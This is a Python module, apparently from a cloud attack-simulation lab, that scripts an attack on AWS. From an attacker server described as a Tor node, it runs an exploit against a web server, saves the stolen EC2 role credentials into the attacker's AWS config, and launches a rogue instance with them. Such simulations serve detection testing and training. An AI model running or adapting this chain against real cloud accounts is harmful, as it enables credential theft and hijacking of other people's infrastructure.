import subprocess

from core.helpers import notify, pbar_sleep


def attack(data):

    notify('Bringing up the Vulnerable Application')
    sleep_duration = 300
    pbar_sleep(sleep_duration)

    # TODO: review notifications to ensure they line up with what's really going on
    # TODO: replace subprocess calls with programmatic structures that can
    #   interact with the output and respond appropriately
    notify('Export Meta Data of Infra')
    notify('Get into the attacker machine - Tor Node')

    ATTACKER_SERVER_PUBLIC_IP = data["Attacker Server Public IP"]
    WEB_SERVER_PUBLIC_IP = data["Web Server Public IP"]
    SUBNET_ID = data["Subnet ID"]
    AMI_ID = data["AMI ID"]
    KEY_PAIR_NAME = data["Key Pair Name"]
    REGION = data["Region"]
    INSTANCE_NAME = 'Cobra-Anomalous'
    print("Web Server Public IP: ", WEB_SERVER_PUBLIC_IP)

    notify('Running exploit on Remote Web Server')
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./files/var/ssh/id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 exploit.py "+WEB_SERVER_PUBLIC_IP+" > /home/ubuntu/.aws/credentials'", shell=True)

    notify('Initiate EC2 takeover, got Shell Access')
    notify('Exfiltrate Node Role Credentials and loading Creds in Attackers Machine')
    notify('Role Details')

    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./files/var/ssh/id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'aws sts get-caller-identity'", shell=True)

    notify('Anomalous Infra Rollout') 
    aws_command = (
        f"aws ec2 run-instances --image-id {AMI_ID} --instance-type t2.micro --key-name {KEY_PAIR_NAME} --subnet-id {SUBNET_ID} --region {REGION} --tag-specifications 'ResourceType=instance,Tags=[{{Key=Name,Value={INSTANCE_NAME}}}]' | jq -r '.Instances[].InstanceId'"
    )
    # Construct the full SSH command with jq and xargs
    ssh_command = (f"ssh -o StrictHostKeyChecking=accept-new -i ./files/var/ssh/id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} \"{aws_command}\" ")
    
    # Execute the command
    try:
        instance_id = subprocess.check_output(ssh_command, shell=True, text=True)
        print(instance_id)
    except subprocess.CalledProcessError as e:
        print(f"Command failed with error: {e}")

    # TODO: should "unmanaged" resources be added via pulumi import somehow? See infra/extra.py
    # subprocess.run(f"pulumi -C scenarios/scenario_1/infra/ import aws:ec2/instance:Instance {INSTANCE_NAME.strip()} {instance_id.strip()} --protect=false --yes --stack=aws-scenario-1 --suppress-outputs --suppress-progress > /dev/null 2>&1", shell=True)

    # TODO: only return true if attack succeeded?
    return True
